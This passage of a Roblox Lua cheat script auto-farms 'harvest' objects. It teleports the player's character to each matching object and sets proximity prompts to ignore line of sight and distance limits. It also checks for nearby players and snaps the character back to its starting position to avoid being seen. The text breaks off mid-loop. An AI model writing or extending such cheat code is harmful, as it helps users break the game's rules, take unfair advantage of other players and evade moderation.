        task.spawn(function()
            while harvesting do
                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                
                if rootPart then
                    local originalPosition = rootPart.CFrame
                    
                    for _, v in ipairs(workspace:GetDescendants()) do
                        if not harvesting then break end
                        if checkNearbyPlayers(rootPart) then
                            rootPart.CFrame = originalPosition
                            task.wait(2)
                            break
                        end
                        
                        local isHarvest = string.find(string.lower(v.Name), "harvest") 
                                          or (v:IsA("ProximityPrompt") and string.find(string.lower(v.ObjectText), "harvest"))
                                          or (v:IsA("ProximityPrompt") and string.find(string.lower(v.ActionText), "harvest"))
                        
                        if isHarvest then
                            local targetPart = v.Parent
                            if targetPart and targetPart:IsA("BasePart") then
                                rootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
                                task.wait(tpDelay)
                                
                                if v:IsA("ProximityPrompt") then
                                    v.RequiresLineOfSight = false
                                    v.MaxActivationDistance = 999999
